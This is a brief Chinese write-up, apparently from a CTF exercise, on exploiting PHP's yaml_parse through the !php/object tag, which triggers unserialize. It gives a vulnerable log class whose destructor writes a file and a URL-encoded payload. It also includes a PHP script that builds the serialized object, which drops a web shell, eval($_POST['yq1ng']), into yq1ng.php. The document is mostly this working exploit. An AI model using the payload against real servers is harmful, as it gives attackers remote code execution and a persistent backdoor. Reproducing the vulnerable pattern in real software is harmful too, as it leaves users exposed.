## **yaml_parse的反序列化**
```
class log{
    public $filename;
    public $content;
    public function __construct($n,$c){
        $this->filename=$n;
        $this->content=$c;
    }
    public function __destruct(){
        file_put_contents($this->filename, $this->content);
    }
}

$log = 'web.log';
$content = yaml_parse($_POST['content']);
new log($log,$content);
```
yaml_parse的使用介绍中，如果内容带着!php/objec标签，则这个标签后的内容会调用unserialize()即反序列化。
payload：
```
content=!php/object O%3A3%3A%22log%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A9%3A%22yq1ng.php%22%3Bs%3A7%3A%22content%22%3Bs%3A31%3A%22%3C%3Fphp+eval%28%24_POST%5B%22yq1ng%22%5D%29%3B+%3F%3E%22%3B%7D
```
```
<?php

class log
{
    public $filename;
    public $content;

    public function __construct()
    {
        $this->filename = 'yq1ng.php';
        $this->content = '<?php eval($_POST["yq1ng"]); ?>';
    }
}

echo((serialize(new log)));
```